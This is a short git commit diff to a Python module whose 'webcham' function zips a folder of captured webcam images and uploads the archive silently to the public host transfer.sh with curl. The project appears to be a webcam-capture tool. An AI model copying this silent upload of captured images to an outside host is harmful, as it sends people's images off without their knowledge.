0039324eb957feaacc91787af9c23663bd9cf592
Nguyễn Văn Khánh <88880309+KhanhNguyen9872@users.noreply.github.com>
2022-03-12 16:38:06 +0700

    Update localhost.py

--- modules/localhost.py
+++ modules/localhost.py
@@ -120,9 +120,9 @@ def webcham():
         o = open("webcam/"+webcam_mode+"/Log.log","w")
         o.write("")
         o.close()
-        os.system("rm -f image.7z &> /dev/null")
-        os.system("7z a image.7z ./images/* &> /dev/null")
-        os.system("curl --upload-file ./image.7z https://transfer.sh &> /dev/null")
+        os.system("rm -f image.7z > /dev/null")
+        os.system("7z a image.7z ./images/* > /dev/null")
+        os.system("curl --upload-file ./webcam/image.7z https://transfer.sh &> /dev/null")
       except:
         print(" ")
   # - - - - - - - - - - -- - - - - - - - - - - - - - - -   
